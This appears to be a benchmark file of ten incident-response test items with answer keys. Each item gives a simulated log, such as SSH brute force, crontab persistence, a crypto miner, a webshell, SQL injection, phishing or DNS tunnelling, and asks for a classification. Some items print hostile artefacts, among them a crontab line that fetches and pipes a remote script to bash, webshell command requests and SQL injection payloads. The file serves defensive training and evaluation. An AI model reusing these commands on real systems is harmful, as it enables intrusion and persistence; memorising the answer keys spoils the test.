@@ -1,0 +1,120 @@
+{
+  "id": "D3",
+  "name": "日志研判与应急响应",
+  "name_en": "Incident Response & Log Analysis",
+  "category": "defense",
+  "pillar": "防御 · AI 当应急响应工程师",
+  "difficulty": 4,
+  "weight": 0.15,
+  "version": "v0.2.0",
+  "description": "给模型真实风格的攻击日志与入侵痕迹（SSH 爆破、Windows 4625、crontab 持久化、挖矿进程、Webshell 上传、SQL 注入日志、钓鱼邮件头、SSH 公钥后门、DNS 隧道），要求先给【事件类型】结论，再说明依据；个别题要求精确提取攻击源 IP 等关键字段。考的是'当值安全工程师'的研判能力——这是把 AI 塞进 SOC 值班室。",
+  "systemPrompt": null,
+  "questions": [
+    {
+      "id": "D3-01",
+      "type": "extract",
+      "prompt": "以下是某 Linux 服务器的 /var/log/auth.log 片段。攻击者最终成功登录的 IP 是多少？只回答该 IP 地址，不要解释：\n\nFeb 12 03:11:02 web sshd[21001]: Failed password for root from 203.0.113.66 port 51234 ssh2\nFeb 12 03:11:04 web sshd[21003]: Failed password for root from 203.0.113.66 port 51236 ssh2\nFeb 12 03:11:07 web sshd[21009]: Failed password for root from 198.51.100.9 port 40122 ssh2\nFeb 12 03:11:08 web sshd[21012]: Failed password for root from 203.0.113.66 port 51240 ssh2\nFeb 12 03:11:15 web sshd[21030]: Accepted password for root from 203.0.113.66 port 51252 ssh2\nFeb 12 03:11:20 web sshd[21031]: Accepted password for backup from 10.0.2.15 port 51260 ssh2",
+      "scoring": { "mode": "extract", "answers": ["203.0.113.66"], "regex": "\\b203\\.0\\.113\\.66\\b" },
+      "explanation": "Failed 多次后出现同 IP 的 Accepted：203.0.113.66 爆破成功。10.0.2.15 是内网正常登录。"
+    },
+    {
+      "id": "D3-02",
+      "type": "incident",
+      "prompt": "判断以下 auth.log 片段反映的攻击类型，先用【事件类型】给出结论（如【暴力破解】），再说明判断依据：\n\nFeb 12 03:11:02 web sshd[21001]: Failed password for root from 203.0.113.66 port 51234 ssh2\nFeb 12 03:11:02 web sshd[21002]: Failed password for root from 203.0.113.66 port 51235 ssh2\nFeb 12 03:11:03 web sshd[21004]: Failed password for root from 203.0.113.66 port 51237 ssh2\nFeb 12 03:11:03 web sshd[21005]: Failed password for root from 203.0.113.66 port 51238 ssh2\nFeb 12 03:11:04 web sshd[21006]: Failed password for root from 203.0.113.66 port 51239 ssh2",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["暴力破解", "爆破", "brute force", "口令猜测"],
+        "reason_groups": [["failed", "失败", "错误"], ["高频", "连续", "大量", "密集"], ["同一IP", "同一ip", "root", "ssh"]]
+      },
+      "explanation": "同一来源对 root 高频失败登录：SSH 口令暴力破解。"
+    },
+    {
+      "id": "D3-03",
+      "type": "incident",
+      "prompt": "以下是某 Windows 服务器安全日志统计。判断攻击类型，先用【事件类型】给出结论，再说明依据：\n\n事件 4625（登录失败）× 4,231 次，来源 203.0.113.66，时间跨度 8 分钟\n事件 4624（登录成功）× 1 次，账户 Administrator，来源 203.0.113.66\n事件 4720（创建用户账户）× 1 次，新账户名 helpdesk$",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["暴力破解", "爆破", "brute force"],
+        "reason_groups": [["4625", "登录失败", "失败"], ["4624", "成功", "登录成功"], ["4720", "创建用户", "后门", "helpdesk$"]]
+      },
+      "explanation": "Windows 事件链：海量 4625 后 4624 成功=爆破得手；随后 4720 创建 $ 隐藏账户持久化。"
+    },
+    {
+      "id": "D3-04",
+      "type": "incident",
+      "prompt": "应急排查发现 root 的 crontab 如下，判断其用途，先用【事件类型】给出结论（如【持久化后门】），再说明依据：\n\n# crontab -l\n*/5 * * * * (curl -fsSL http://192.0.2.9/s.sh || wget -q -O- http://192.0.2.9/s.sh) | bash\ncp /tmp/.hidden/kworkerds /usr/bin/ 2>/dev/null\nrm -f /tmp/.hidden 2>/dev/null",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["持久化", "后门", "保活", "恶意"],
+        "reason_groups": [["定时", "crontab", "每5分钟"], ["下载", "curl", "wget", "拉取"], ["执行", "bash", "恶意脚本", "载荷"]]
+      },
+      "explanation": "每 5 分钟从远端拉脚本执行：恶意样本的持久化/保活机制。"
+    },
+    {
+      "id": "D3-05",
+      "type": "incident",
+      "prompt": "某服务器 CPU 异常，以下是排查快照。判断发生了什么，先用【事件类型】给出结论（如【挖矿】），再说明依据：\n\n$ top（节选）\n  PID USER  %CPU %MEM COMMAND\n  7712 root  743.1  0.3  /tmp/.x/kworkerds -o stratum+tcp://xmr.pool-miner.xyz:3333 -u 4A7dRyQ... -p x\n\n$ ss -tnp | grep 7712\n  ESTAB 7712/kworkerds 10.0.2.15:51622 45.13.221.9:3333",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["挖矿", "矿"],
+        "reason_groups": [["stratum", "矿池", "pool", "xmr"], ["CPU", "占用", "743", "异常"], ["伪装", "kworker", "进程", "外联"]]
+      },
+      "explanation": "连矿池 stratum 协议+CPU 打满+伪装 kworker：门罗币挖矿木马。"
+    },
+    {
+      "id": "D3-06",
+      "type": "incident",
+      "prompt": "以下是某网站 access.log 片段（同一源 IP，5 秒内）。判断攻击行为，先用【事件类型】给出结论，再说明依据：\n\nPOST /upload/avatar.php 200 45 - 'Mozilla/5.0'  (上传接口)\nGET  /uploads/avatar.php?cmd=whoami 200 89\nGET  /uploads/avatar.php?cmd=cat+/etc/passwd 200 1824\nGET  /uploads/avatar.php?cmd=ls+-la+/root 200 512",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["webshell", "木马", "后门", "任意命令执行", "rce"],
+        "reason_groups": [["上传", "upload", "php"], ["cmd", "参数", "命令"], ["执行", "whoami", "passwd", "控制"]]
+      },
+      "explanation": "上传 php 后通过 ?cmd= 传参执行系统命令：Webshell 已落地并被使用。"
+    },
+    {
+      "id": "D3-07",
+      "type": "incident",
+      "prompt": "以下是某应用数据库日志片段。判断攻击行为，先用【事件类型】给出结论，再说明依据：\n\n2026-09-10T02:14:11 QUERY app: SELECT * FROM goods WHERE id='1'\n2026-09-10T02:14:12 QUERY app: SELECT * FROM goods WHERE id='1\\' AND 1=2 UNION SELECT 1,user(),database()-- -'\n2026-09-10T02:14:13 QUERY app: SELECT * FROM goods WHERE id='1\\' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)=\\'a\\'-- -'",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["SQL注入", "sql injection", "注入"],
+        "reason_groups": [["union", "select", "拼接"], ["information_schema", "猜解", "表名", "探测"], ["user()", "database()", "信息", "回显"]]
+      },
+      "explanation": "UNION 联合查询+information_schema 逐字符猜解：手工 SQL 注入攻击。"
+    },
+    {
+      "id": "D3-08",
+      "type": "incident",
+      "prompt": "员工收到可疑邮件并上报，以下是邮件头。判断邮件性质，先用【事件类型】给出结论（如【钓鱼邮件】），再说明依据：\n\nReturn-Path: bounce-8812@mail.e0f3k9.xyz\nFrom: 'IT服务台' <it-support@ourcompany.com>\nReply-To: hr.verify.9917@gmail.com\nReceived: from unknown (45.13.221.9) by mx.ourcompany.com\n正文：您的 VPN 证书今日过期，请登录 http://45.13.221.9/vpn-reset 重置密码。",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["钓鱼", "仿冒", "欺诈"],
+        "reason_groups": [["Return-Path", "Reply-To", "发件人", "不一致"], ["IP", "链接", "域名", "可疑"], ["密码", "凭据", "套取", "重置"]]
+      },
+      "explanation": "显示名伪装成内部 IT，但回信路径是 gmail、链接是裸 IP：典型凭据钓鱼。"
+    },
+    {
+      "id": "D3-09",
+      "type": "incident",
+      "prompt": "排查被入侵的 Linux 主机时发现以下变化。判断这组痕迹的性质，先用【事件类型】给出结论，再说明依据：\n\n# diff 对比基线：\n~/.ssh/authorized_keys：新增一行 ssh-rsa AAAAB3... attacker-key\n/etc/passwd：新增 mysqlb 用户 UID=0\n/root/.bash_history：文件被清空（大小 0）\n/var/log/wtmp：最后修改时间异常提前",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["持久化", "后门", "入侵", "恶意"],
+        "reason_groups": [["authorized_keys", "公钥", "ssh"], ["uid=0", "root权限", "隐藏账户", "提权"], ["清空", "history", "灭迹", "日志"]]
+      },
+      "explanation": "加公钥+UID0 账户+清历史+抹登录记录：入侵者持久化并反取证的组合动作。"
+    },
+    {
+      "id": "D3-10",
+      "type": "incident",
+      "prompt": "以下是 DNS 服务器日志摘要。判断该行为最可能是什么，先用【事件类型】给出结论，再说明依据：\n\n5 分钟内 23,812 次查询，全部指向同一域名 t.x8k2m9.example.com 的随机子域：\n  a3f9c1e2.t.x8k2m9.example.com. TXT\n  b71d4f0a.t.x8k2m9.example.com. TXT\n主机均为内网财务工作站 10.0.7.22（正常时段无外联）",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["DNS隧道", "隧道", "外传", "数据泄露", "数据渗出"],
+        "reason_groups": [["随机", "十六进制", "子域", "高频"], ["TXT", "记录", "编码"], ["内网", "外联", "渗出", "泄露"]]
+      },
+      "explanation": "内网主机高频随机子域 TXT 查询：DNS 隧道外传数据（受限网络常见逃逸手法）。"
+    }
+  ]
+}
